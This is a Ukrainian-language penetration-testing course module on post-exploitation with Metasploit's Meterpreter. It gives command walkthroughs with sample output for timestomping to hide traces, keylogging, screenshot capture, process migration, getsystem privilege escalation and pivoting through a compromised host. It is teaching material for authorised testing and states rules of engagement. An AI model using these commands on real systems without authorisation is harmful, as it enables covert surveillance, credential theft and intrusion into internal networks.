Пост-експлуатація та Meterpreter

2 год Нова

9.1 Вступ до пост-експлуатації

Пост-експлуатація (Post-Exploitation) — етап пентесту, що починається після отримання початкового доступу до цільової системи. Це один із найскладніших та найважливіших етапів, оскільки саме тут пентестер демонструє реальний бізнес-вплив компрометації.

Якщо попередні етапи (розвідка, сканування, експлуатація) — це "відкрити двері", то пост-експлуатація — це "що саме зловмисник може зробити всередині". Результати цього етапу визначають критичність знайдених вразливостей у фінальному звіті.

Цілі пост-експлуатації

Ціль Опис Приклад
Situation Awareness Зрозуміти, де ми: ОС, мережа, привілеї, оточення sysinfo, ipconfig, whoami
Privilege Escalation Підвищити привілеї до адміністратора / root getsystem, kernel exploits
Credential Harvesting Зібрати паролі, хеші, токени, ключі hashdump, mimikatz, keylogging
Data Exfiltration Знайти та вилучити цінні дані Файли, БД, конфігурації, PII
Lateral Movement Переміститися на інші системи в мережі Pass-the-Hash, PsExec, pivoting
Persistence Забезпечити збереження доступу після перезавантаження Backdoors, scheduled tasks, registry
Impact Assessment Оцінити бізнес-вплив компрометації Доступ до фінансових даних, PII

MITRE ATT&CK: тактики пост-експлуатації

MITRE ATT&CK Framework — база знань про тактики, техніки та процедури (TTPs) зловмисників. Для пост-експлуатації релевантні такі тактики:

Тактика ATT&CK ID Опис
Execution TA0002 Запуск шкідливого коду (PowerShell, scripts, WMI)
Persistence TA0003 Збереження доступу (registry, scheduled tasks, services)
Privilege Escalation TA0004 Підвищення привілеїв (UAC bypass, token manipulation)
Defense Evasion TA0005 Обхід захисту (process injection, timestomping)
Credential Access TA0006 Крадіжка облікових даних (LSASS dump, keylogging)
Discovery TA0007 Збір інформації про систему та мережу
Lateral Movement TA0008 Переміщення між системами (RDP, SMB, WinRM)
Collection TA0009 Збір цільових даних (файли, email, clipboard)
Exfiltration TA0010 Вилучення даних (C2, DNS tunneling, cloud)

Етичні та правові аспекти

  • Scope of Engagement — пост-експлуатація повинна бути чітко прописана в договорі (Rules of Engagement)
  • Деструктивні дії заборонені — не видаляти дані, не зупиняти сервіси, не модифікувати продакшн
  • Мінімальний вплив — збирати тільки необхідні докази, не ексфільтрувати реальні дані клієнтів
  • Документування — кожна дія повинна бути задокументована з timestamp
  • Очищення — після тесту видалити всі backdoor'и, файли, акаунти

9.2 Meterpreter: архітектура та основи

Meterpreter (Meta-Interpreter) — розширена оболонка Metasploit Framework, що працює повністю в пам'яті скомпрометованої системи. На відміну від звичайного shell (cmd.exe, /bin/sh), Meterpreter надає багатий набір команд для пост-експлуатації, шифрує трафік та не залишає слідів на диску.

Архітектура Meterpreter

Ключові характеристики:

  • In-Memory Execution — DLL-ін'єкція у процес, ніколи не торкається диску
  • Encrypted Communication — TLS-шифрований канал між атакуючим і жертвою
  • Extensible — завантаження додаткових модулів (extensions) на льоту
  • Stager + Stage — малий stager встановлює з'єднання, потім завантажує повний stage
  • Process Migration — переміщення між процесами без перезавантаження
  • Channel-based I/O — множинні канали в одній сесії (shell, port forward)

Типи Meterpreter payload'ів

Payload Платформа Транспорт Опис
windows/meterpreter/reverse_tcp Windows x86 TCP Класичний reverse shell
windows/x64/meterpreter/reverse_tcp Windows x64 TCP 64-бітна версія
windows/meterpreter/reverse_https Windows HTTPS Шифрований, обходить firewall
linux/x86/meterpreter/reverse_tcp Linux x86 TCP Linux reverse shell
python/meterpreter/reverse_tcp Cross-platform TCP Python-based, без компіляції
php/meterpreter/reverse_tcp PHP (Web) TCP Для веб-серверів з PHP
java/meterpreter/reverse_tcp Java TCP Java-based, кросплатформний

9.4 Файлові операції та пошук даних

Файлові операції в Meterpreter дозволяють навігувати по файловій системі, знаходити цінні файли, завантажувати їх на атакуючу машину та маніпулювати метаданими для приховування слідів.

Навігація та базові операції

# Навігація
meterpreter> pwd
C:\Users\jsmith\Desktop
meterpreter> cd C:\\Users
meterpreter> ls

Listing: C:\Users

40777/rwxrwxrwx   0     dir   2024-01-15 09:00:00 +0200  Public

meterpreter> cat C:\\Users\\jsmith\\Desktop\\passwords.txt

Timestomping (маніпуляція часовими мітками)

Timestomping — техніка зміни часових міток файлів (Created, Modified, Accessed, Entry Modified) для приховування слідів. MITRE ATT&CK: T1070.006.

# Перегляд поточних часових міток
meterpreter> timestomp C:\\Windows\\Temp\\nc.exe -v

Created    : 2024-03-15 14:23:01 +0200
Modified   : 2024-03-15 14:23:01 +0200
Accessed   : 2024-03-15 14:25:33 +0200
Entry Modified: 2024-03-15 14:23:01 +0200

# Зміна Modified timestamp (замаскувати під системний файл)
meterpreter> timestomp C:\\Windows\\Temp\\nc.exe -m "2023-01-15 08:30:00"

# Скопіювати мітки з іншого файлу
meterpreter> timestomp C:\\Windows\\Temp\\nc.exe -f C:\\Windows\\System32\\calc.exe

# Очистити MACE значення (зробить файл "невидимим" для деяких інструментів)
meterpreter> timestomp C:\\Windows\\Temp\\nc.exe -b

Цінні файли для пошуку

Тип Файли Що шукаємо

Конфігурації web.config, .env, *.conf, *.ini DB credentials, API keys
SSH ключі id_rsa, id_ed25519, *.pem Приватні ключі для доступу
Бази даних *.db, *.sqlite, *.mdb Дані користувачів

9.5 Кейлоггінг, скріншоти та спостереження

Meterpreter надає можливості для спостереження за діями користувача в реальному часі: перехоплення натискань клавіш, знімки екрана, доступ до веб-камери та мікрофону. Ці функції демонструють серйозність компрометації у звіті про пентест.

Кейлоггінг (Keystroke Logging)

MITRE ATT&CK: T1056.001 — Input Capture: Keylogging

# Запуск кейлоггера
meterpreter> keyscan_start
Starting the keystroke sniffer ...

# ... користувач працює, вводить дані ...

# Зчитування перехоплених натискань
meterpreter> keyscan_dump
Dumping captured keystrokes...
admin <Tab> P@ssw0rd123 <Return>
Dear John, <Return> Please find attached the quarterly report...

# Зупинка кейлоггера
meterpreter> keyscan_stop
Stopping the keystroke sniffer ...

Важливо: кейлоггер перехоплює натискання у процесі, до якого прив'язана сесія Meterpreter. Для перехоплення вводу іншого користувача — спочатку мігруйте до його процесу (наприклад, explorer.exe).

Знімки екрана (Screenshots)

# Одиночний скріншот
meterpreter> screenshot

# Скріншот з вказанням шляху
meterpreter> screenshot -p /tmp/loot/screen1.jpg

# Потоковий скріншот (кожні N секунд)
# Через post-модуль:
meterpreter> run post/multi/gather/screen_spy DELAY=5 COUNT=20
[*] Capturing 20 screenshots with 5 second delay
[*] Screen spy image 1/20 saved to /root/.msf4/loot/...

9.6 Міграція процесів та ескалація привілеїв

Міграція процесів (Process Migration)

Міграція — переміщення Meterpreter-сесії з одного процесу в інший. Причини для міграції:

  • Стабільність — якщо поточний процес нестабільний або може бути закритий
  • Привілеї — міграція у процес з вищими привілеями
  • Кейлоггінг — міграція в explorer.exe для перехоплення клавіш
  • Уникнення виявлення — "сховатися" у легітимному системному процесі
  • Архітектурна сумісність — з x86 процесу в x64 або навпаки
# Перегляд поточного процесу
meterpreter> getpid
Current pid: 4872  (notepad.exe)

# Список процесів
meterpreter> ps
 PID   Name                 Arch  User
 ---   ----                 ----  ----
 552   csrss.exe            x64   NT AUTHORITY\SYSTEM
 2816  explorer.exe         x64   CORP\jsmith
 3120  svchost.exe          x64   NT AUTHORITY\SYSTEM
 3456  chrome.exe           x64   CORP\jsmith

# Міграція в explorer.exe (стабільний, з привілеями користувача)
meterpreter> migrate 2816
[*] Migrating from 4872 to 2816...
[*] Migration completed successfully.

# Автоматична міграція (знайде відповідний процес)
meterpreter> run post/windows/manage/migrate
[*] Running module against WIN-TARGET01
[*] Current server process: notepad.exe (4872)
[*] Spawning notepad.exe process to migrate into
[*] Migrating into 5120

Ескалація привілеїв (Privilege Escalation)

Ескалація привілеїв — підвищення рівня доступу від звичайного користувача до адміністратора (Windows) або root (Linux). MITRE ATT&CK: TA0004.

Метод 1: getsystem

# Автоматична ескалація (потрібні локальні адміністраторські привілеї)
meterpreter> getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

# Перевірка
meterpreter> getuid
Server username: NT AUTHORITY\SYSTEM

# Техніки getsystem:
# 1. Named Pipe Impersonation (In Memory/Admin)
# 2. Named Pipe Impersonation (Dropper/Admin)
# 3. Token Duplication (In Memory/Admin)
# 4. Named Pipe Impersonation (RPCSS variant)

Метод 2: UAC Bypass

9.8 Pivoting та латеральний рух

Pivoting — використання скомпрометованої машини як "точки опори" для доступу до інших мереж та систем, що недоступні напряму з атакуючої машини. Це ключова техніка для проникнення у внутрішні сегменти корпоративної мережі.

Сценарій Pivoting

# Типова ситуація:
# Атакуючий: 192.168.1.50 (Kali)
# Жертва 1: 192.168.1.100 (зовнішній інтерфейс)
#            10.0.0.5       (внутрішній інтерфейс)
# Ціль 2:   10.0.0.10     (тільки внутрішня мережа — DC, БД тощо)

# Атакуючий НЕ може напряму досягти 10.0.0.10
# Але може використати Жертву 1 як "pivot point"

Метод 1: Autoroute (маршрутизація через Metasploit)

# Додати маршрут через сесію Meterpreter
meterpreter> run autoroute -s 10.0.0.0/24

[*] Adding a route to 10.0.0.0/255.255.255.0...
[+] Added route to 10.0.0.0/24 via 192.168.1.100

# Або через post-модуль
meterpreter> run post/multi/manage/autoroute

# Перевірка маршрутів
meterpreter> background
msf6> route print

IPv4 Active Routing Table
=========================
   Subnet             Netmask            Gateway
   ------             -------            -------
   10.0.0.0           255.255.255.0      Session 1

# Тепер Metasploit може сканувати 10.0.0.0/24 через Session 1
msf6> use auxiliary/scanner/portscan/tcp
msf6 auxiliary(tcp)> set RHOSTS 10.0.0.10
msf6 auxiliary(tcp)> set PORTS 22,80,135,139,445,3389
msf6 auxiliary(tcp)> run

[+] 10.0.0.10:445 - TCP OPEN
[+] 10.0.0.10:3389 - TCP OPEN

Метод 2: Port Forwarding (portfwd)

# Local port forward — доступ до порту на внутрішній машині
# Формат: portfwd add -l LOCAL_PORT -p REMOTE_PORT -r REMOTE_HOST

# Прокинути RDP (3389) внутрішньої машини на локальний порт
meterpreter> portfwd add -l 3389 -p 3389 -r 10.0.0.10
[*] Local TCP relay created: :3389 <-> 10.0.0.10:3389

# Тепер підключаємося з Kali до localhost:3389
$ xfreerdp /u:Administrator /v:127.0.0.1:3389

# Прокинути веб-сервер
meterpreter> portfwd add -l 8080 -p 80 -r 10.0.0.10
# Відкрити http://127.0.0.1:8080 у браузері

# Прокинути базу даних
meterpreter> portfwd add -l 3306 -p 3306 -r 10.0.0.20
# mysql -h 127.0.0.1 -P 3306 -u root -p

# Reverse port forward (жертва підключається назад)
meterpreter> portfwd add -R -l 8443 -p 8443 -L 192.168.1.50

# Список активних port forward'ів
meterpreter> portfwd list

# Видалити port forward
meterpreter> portfwd delete -l 3389 -p 3389 -r 10.0.0.10
meterpreter> portfwd flush   # видалити всі

Метод 3: SOCKS Proxy

# Запуск SOCKS4a proxy через Metasploit
msf6> use auxiliary/server/socks_proxy
msf6 auxiliary(socks_proxy)> set SRVPORT 1080
msf6 auxiliary(socks_proxy)> set VERSION 4a
msf6 auxiliary(socks_proxy)> run -j

[*] Starting the SOCKS proxy server on 0.0.0.0:1080

# Налаштування proxychains (/etc/proxychains4.conf)
# Додати в кінець:
socks4 127.0.0.1 1080

# Тепер будь-який інструмент може працювати через pivot
$ proxychains nmap -sT -Pn -p 22,80,445,3389 10.0.0.10
$ proxychains curl http://10.0.0.10
$ proxychains ssh admin@10.0.0.10
$ proxychains crackmapexec smb 10.0.0.0/24
